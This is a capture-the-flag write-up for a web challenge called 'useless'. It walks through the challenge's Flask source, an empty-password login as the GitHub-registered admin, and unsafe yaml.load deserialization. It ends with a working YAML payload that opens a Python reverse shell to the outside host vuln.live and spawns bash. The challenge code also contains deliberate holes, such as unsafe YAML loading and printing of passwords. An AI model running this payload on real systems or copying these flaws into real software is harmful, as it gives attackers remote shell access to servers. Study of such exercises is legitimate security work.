## useless (3 solves, 2nd blood)

Author: sqrtrev

```
This is only a useless website, true hackers don't need descriptions.
Flag is at /flag.txt .

Link
download

Author: _**KAHLA**_
```

```python
# main.py
from flask import Flask
from os import sys, path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))

from models import users
from config import DevelopmentConfig,ProductionConfig
from flask_login import LoginManager
from routes import auth,generator
from models import base
from time import sleep
app = Flask(__name__)
app.config.from_object(ProductionConfig())
app.config["JWT_ACCESS_TOKEN_EXPIRES"]=172800
login = LoginManager(app)
sleep(20)
base.init_db()
app.register_blueprint(auth.auth_bp)
app.register_blueprint(auth.github_authbp, url_prefix="/auth")
app.register_blueprint(generator.gen_bp, url_prefix="/")


@login.user_loader
def load_user(id):
    return users.User.query.get(int(id))
if __name__=="__main__":
    app.run()
```

Okay,,, Server is using Flask.

Let's start analysis.



```python
# models/users.py
from sqlalchemy import Column, Integer, String,Boolean
from .base import Base
from werkzeug.security import generate_password_hash,check_password_hash
from flask_login import UserMixin
class User(UserMixin,Base):
    __tablename__ = 'users'
    id = Column(Integer, primary_key=True)
    username = Column(String(50), unique=True)
    email = Column(String(120), unique=True)
    password_hash=Column(String(200))
    is_admin=Column(Boolean)
    def __init__(self, username=None, email=None,password="",is_admin=False):
        self.username = username
        self.email = email
        print("pass :"+password)
        self.set_password(password)
        self.is_admin=is_admin

    def set_password(self, password):
        self.password_hash = generate_password_hash(password)

    def check_password(self, password):
        print("res: "+str(check_password_hash(self.password_hash, password)))
        return check_password_hash(self.password_hash, password)

    def __repr__(self):
        return '<User %r>' % (self.username)
```



The class `User` has 5 columns like below:

```
id = Looks like a kind of primary key like idx
username = Yeah, username
email = Also email
password_hash = hashed password will be here
is_admin = checking admin
```



```python
# routes/auth.py
from flask import  request,Blueprint,redirect,url_for,render_template
import sys
from os import path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))

from models import users,oauth
from flask_dance.consumer import oauth_authorized,oauth_error
from flask_dance.consumer.storage.sqla import SQLAlchemyStorage
from flask_login import (
     login_required,logout_user, login_user,current_user
)
from flask_dance.contrib.github import make_github_blueprint,github
from models import base
import re
import os
github_authbp=make_github_blueprint(
    client_id=os.getenv("CLIENT_ID"),
    client_secret=os.getenv("CLIENT_SECRET")
)

github_authbp.storage=SQLAlchemyStorage(oauth.OAuth,base.db_session,user=current_user)
auth_bp=Blueprint("auth_bp",__name__)
def validate_on_login(cred):
    return re.sub("[^0-9a-zA-Z]+","",cred)
def validate_username(username):
    user=users.User.query.filter_by(username=username).first()
    if user is not None:
        return False
    else:
        return True

@auth_bp.route("/login",methods=["POST","GET"])
def login():
    if current_user.is_authenticated:
        return redirect(url_for('index'))
    if request.method=="POST":
        username=request.form.get("username")
        password=request.form.get("password")
        if username is not None and password is not None and not username=="" and not password=="":
            username=validate_on_login(username)
            password=validate_on_login(password)
            user = users.User.query.filter_by(username=username).first()
            if user is None or not user.check_password(password):
                return render_template("login.html",msg="Invalid username or password")
            login_user(user)
            return redirect("/home")
        else:
            return render_template('login.html',msg="Invalid username or password")
    else:
        return render_template('login.html',msg="")
@auth_bp.route('/logout',methods=["GET"])
def logout():
    logout_user()
    return redirect("/")
@auth_bp.route("/register",methods=["POST","GET"])
def register():
    if request.method=="POST":
        username=validate_on_login(request.form.get("username"))
        password=validate_on_login(request.form.get("password"))
        email=request.form.get("email")
        if not username or not password or not email:
            return render_template("register.html",msg="Invalid informations")
        if not validate_username(username):
            return render_template("register.html",msg="This username is already used")
        user=users.User(username=username,email=email)
        user.set_password(password)
        base.db_session.add(user)
        base.db_session.commit()
        login_user(user)
        return redirect("/home")
    else:
        return render_template("register.html",msg="")


@oauth_authorized.connect_via(github_authbp)
def github_oauth(github_authbp,token):
    if not github.authorized:
        return redirect(url_for("github.login"))
    resp = github.get("/user")
    if not resp.ok:
        return redirect(url_for("github.login"))
    info=resp.json()
    auth=oauth.OAuth.query.filter_by(provider_user_id=info["id"]).first()
    if auth is None:
        auth = oauth.OAuth(provider="github", provider_user_id=info["id"], token=token)
        if auth.user:
            login_user(auth.user)
            return redirect("/home",302)
        else:
            if not validate_username(info["login"]):
                return redirect("/register")
            if info["login"]=="fwordadmin":
                user = users.User(username=info["login"], email=info["email"],is_admin=True)
            else:
                user=users.User(username=info["login"],email=info["email"])
            auth.user=user
            base.db_session.add_all([user,auth])
            base.db_session.commit()
            login_user(user)
            return redirect("/home",302)
    else:
        login_user(auth.user)
        return redirect("/home", 302)

@oauth_error.connect_via(github_authbp)
def github_error(githubçauthbp, message,response,state,error,error_description,error_uri):
    return render_template("login.html",msg="An error has occured while authenticating you using Github: "+error)
```

Yeah simple.

```
/login -> For login
/logout -> For logout
/register -> For register
@oauth_authorized.connect_via(github_authbp) -> login with github
```

In oauth, we can realize that the server registers if the account do not exist.

And we can guess the admin's id == `fwordadmin`.

Yeah, It's time to check oauth model logic.

```python
# models/oauth.py
from sqlalchemy.ext.mutable import MutableDict
from .base import Base
from sqlalchemy import Column, Integer,ForeignKey,JSON,DateTime,String
from _datetime import datetime
from sqlalchemy.orm import relationship
class OAuth(Base):
    __tablename__="flask_dance_oauth"
    id = Column(Integer, primary_key=True)
    provider = Column(String(50), nullable=False)
    created_at = Column(DateTime, default=datetime.utcnow, nullable=False)
    token = Column(MutableDict.as_mutable(JSON), nullable=False)
    provider_user_id=Column(Integer,unique=True)
    user_id = Column(Integer, ForeignKey("users.id"))
    user = relationship("User")
    def __repr__(self):
        parts = []
        parts.append(self.__class__.__name__)
        if self.id:
            parts.append("id={}".format(self.id))
        if self.provider:
            parts.append('provider="{}"'.format(self.provider))
        return "<{}>".format(" ".join(parts))
```

If you check the source code, the part `user = relationship("User")` will have the relationship with `sqlalchemy`.

It's simple now. If we register via github, It will not have password(Because server is using relationship between `oauth` and `user`). 

So, we can login with the account `fowrdadmin` like `id=fwordadmin&pw=''`.

After this, we can access `/home`.



```python
# routes/generator.py
from flask import render_template, request,Blueprint
from flask_login import (
     login_required,
    current_user
)
import yaml
import sys
from os import path
sys.path.append(path.dirname(path.dirname(path.abspath(__file__))))

from generator import Generator
from yaml import  Loader
gen_bp=Blueprint("gen_bp",__name__)


def parse(text):
    try:
        res = yaml.load(text, Loader=Loader)
        return res
    except Exception:
        return "An Error has occured"


@gen_bp.route("/home",methods=["POST","GET"])
@login_required
def home():
    if request.method=="GET":
        return render_template("home.html",isAdmin=current_user.is_admin,compose="",image="",name="")
    elif request.method=="POST" and current_user.is_admin:
        port=request.form.get("port")
        service=request.form.get("service")
        if port is not None :
            proxy=Generator.Proxy(port=port)
            compose=proxy.toYaml()
            return render_template("home.html",isAdmin=current_user.is_admin,compose=compose,image="",name="")
        elif service is not None:
            try:
                res=parse(service)
                return render_template("home.html",isAdmin=current_user.is_admin,image=res["services"][list(res["services"].keys())[0]]["image"],name=res["services"][list(res["services"].keys())[0]]["container_name"],compose="")
            except Exception:
                return render_template("home.html",isAdmin=current_user.is_admin,image="An unknow error has occured",name="",compose="")

        else:
            return render_template("home.html", isAdmin=current_user.is_admin, compose="", image="", name="")
    else:
        return render_template("home.html",isAdmin=current_user.is_admin,compose="",image="",name="")
@gen_bp.route("/")
def index():
    return render_template("index.html")
```

Yeah, so beautiful. It's easy now. 

if `port` is None and `service` is not none, we can use the function `parse`. And parse has vulnerability.

```python
def parse(text):
    try:
        res = yaml.load(text, Loader=Loader)
        return res
    except Exception:
        return "An Error has occured"
```

Yeah, this one is quite known thing. `yaml.load` will give me arbitrary code execution.

My final payload was 

```
service=!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('vuln.live',31338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"
```



Then, I'll get reverse shell.

Thank you for nice web tasks, Kahla.